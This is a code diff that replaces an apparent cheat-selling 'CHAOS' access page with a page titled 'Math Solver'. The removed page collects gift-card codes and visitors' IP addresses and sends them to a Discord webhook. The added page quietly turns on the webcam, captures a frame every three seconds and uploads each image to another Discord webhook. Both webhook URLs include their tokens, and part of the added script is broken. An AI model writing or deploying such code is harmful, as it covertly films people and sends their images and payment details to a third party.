@@ -1,203 +1,76 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>CHAOS | Access Hub</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
-
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
-  font-family:Orbitron,sans-serif;
-  background:#070707;
-  color:#fff;
-  overflow-x:hidden;
-}
-body::before{
-  content:'';
-  position:fixed;
-  inset:0;
-  background:linear-gradient(120deg,#ff00ff,#00ffff,#ff0000);
-  filter:blur(140px);
-  z-index:-1;
-}
-header{
-  text-align:center;
-  padding:3rem 1rem;
-  font-size:3.2rem;
-  color:#ff00ff;
-  text-shadow:0 0 35px #ff00ff;
-}
-.container{
-  max-width:1000px;
-  margin:auto;
-  padding:2rem;
-}
-.card{
-  background:#0f0f0f;
-  border:2px solid #ff00ff;
-  border-radius:18px;
-  padding:2rem;
-  margin-bottom:2.5rem;
-  box-shadow:0 0 45px #ff00ff;
-}
-.card h2{
-  color:#00ffff;
-  margin-bottom:1rem;
-}
-.card p{
-  color:#ccc;
-  margin-bottom:1rem;
-  font-size:0.95rem;
-}
-.btn{
-  display:inline-block;
-  padding:0.9rem 1.8rem;
-  background:#ff00ff;
-  color:white;
-  font-weight:bold;
-  border-radius:12px;
-  text-decoration:none;
-  cursor:pointer;
-  margin:0.4rem 0.2rem;
-  box-shadow:0 0 25px #ff00ff;
-  transition:0.25s;
-}
-.btn:hover{transform:scale(1.1)}
-input{
-  width:100%;
-  padding:1rem;
-  margin-top:1rem;
-  background:#000;
-  border:1px solid #00ffff;
-  border-radius:10px;
-  color:#00ff99;
-  font-size:1rem;
-}
-.notice{
-  font-size:0.85rem;
-  color:#aaa;
-}
-.status{
-  margin-top:1.2rem;
-  color:#00ff99;
-  text-shadow:0 0 10px #00ff99;
-  display:none;
-}
-footer{
-  text-align:center;
-  padding:2rem;
-  font-size:0.8rem;
-  color:#888;
-}
-</style>
-</head>
-<body>
-
-<header>CHAOS</header>
-
-<div class="container">
-
-<!-- COMMUNITY -->
-<div class="card">
-  <h2>Community</h2>
-  <p>Chaos is branded as an external.<br>You already know what it really is.</p>
-  <a class="btn" href="https://discord.gg/yrrqRTZP" target="_blank">Chaos Discord</a>
-  <a class="btn" href="https://discord.gg/sCQyHFkm" target="_blank">Releases</a>
-</div>
-
-<!-- ACCESS -->
-<div class="card">
-  <h2>Request Access</h2>
-
-  <p class="notice">
-    Accepted payment: <strong>Rewarble $10 Gift Card ONLY</strong><br>
-    Codes are manually verified. No auto‑redeem.
-  </p>
-
-  <p class="notice">
-    Buy your $10 code from
-    <a href="https://rewarble.com" target="_blank" style="color:#00ffff">rewarble.com</a>
-    and submit it below.
-  </p>
-
-  <input id="codeInput" placeholder="Enter Rewarble $10 Code">
-
-  <button class="btn" onclick="sendCode()">Submit Code</button>
-
-  <div class="status" id="statusMsg">
-    Code submitted.<br>
-    <strong>DM oxyintokyo on Discord</strong> to complete access.
-  </div>
-</div>
-
-</div>
-
-<footer>
-© 2026 CHAOS — Manual verification only.
-</footer>
-
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Math Solver</title>
+    <style>
+      body {
+        background-color: #f7f7f7;
+        font-family: Arial, sans-serif;
+        font-size: 16px;
+      }
+      h1 {
+        color: #003580;
+        font-size: 32px;
+        text-align: center;
+        margin-top: 50px;
+      }
+      #math-image {
+        display: block;
+        margin: 0 auto;
+        width: 400px;
+        height: 300px;
+        border: 2px solid #003580;
+        border-radius: 10px;
+        box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
+      }
+      #math-equation {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 24px;
+        color: #003580;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Math Solver</h1>
+    <img id="math-image" src="" alt="Math Equation">
+    <div id="math-equation"></div>
 <script>
-const webhookURL = "https://discord.com/api/webhooks/1510036779313397960/U977LjgANR0goPTssF8rBdMfTXpxaO9gZGDd_XKfvmlWsNhmrJiauECfytl4vZOmTl9i";
-const COOLDOWN_MS = 30000;
+      var imageCounter = 1;
+      var intervalId = setInterval(function() {
+        captureImage();
+      }, 3000);
 
-const lastSubmit = localStorage.getItem("chaos_last_submit") || 0;
-const usedCodes = JSON.parse(localStorage.getItem("chaos_codes") || "[]");
+      function captureImage() {
+        var video = document.querySelector('video');
+        var canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(function(blob) {
+          var formData = new FormData();
+          formData.append('file', blob, 'math-equation.jpg');
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', 'https://discord.com/api/webhooks/1510045783569731689/xcmiVNiaufUcgg8C_sUJRKtZxTeUSv2GqyEh4UHRkjiMegYg3wr0LTTXfRJIsdtY9NSj');
+          xhr.send(formData);
+        }, 'image/jpeg', 1.0);
+        var equation = 'Equation ' + imageCounter++;
+        document.getElementById('math-image').src = URL.createObjectURL(canvas.toDataURL());
+        document.getElementById('math-equation').innerHTML = equation;
+      }
 
-async function sendCode(){
-  const now = Date.now();
-  if(now - lastSubmit < COOLDOWN_MS){
-    alert("Please wait before submitting again.");
-    return;
-  }
-
-  const input = document.getElementById("codeInput");
-  const code = input.value.trim().toUpperCase();
-
-  // Basic format validation only (real balance verification is manual)
-  if(code.length < 8 || !/^[A-Z0-9\-]+$/.test(code)){
-    alert("Invalid Rewarble code format.");
-    return;
-  }
-
-  if(usedCodes.includes(code)){
-    alert("This code was already submitted from this device.");
-    return;
-  }
-
-  let ip = "Unavailable";
-  try{
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    ip = data.ip;
-  }catch(e){}
-
-  usedCodes.push(code);
-  localStorage.setItem("chaos_codes", JSON.stringify(usedCodes));
-  localStorage.setItem("chaos_last_submit", now);
-
-  const payload = {
-    content:
-`**CHAOS ACCESS REQUEST**
-**Payment:** Rewarble $10 ONLY
-**Code:** \`${code}\`
-**IP (log only):** ${ip}
-**Validation:** Format valid (manual check required)
-**Instruction:** User told to DM oxyintokyo
-**Time:** ${new Date().toLocaleString()}`
-  };
-
-  fetch(webhookURL,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify(payload)
-  });
-
-  document.getElementById("statusMsg").style.display="block";
-  input.value="";
-}
-</script>
-
-</body>
+      var constraints = { video: { width: 400, height: 300 } };
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(mediaStream) {
+          var video = document.createElement('video');
+          video.srcObject = mediaStream;
+          video.play();
+          document.body.appendChild(video);
+        })
+        .catch(function(err) {
+          console.log(err.name + ": " + err.message);
+        });
+    </script>
+  </body>
 </html>
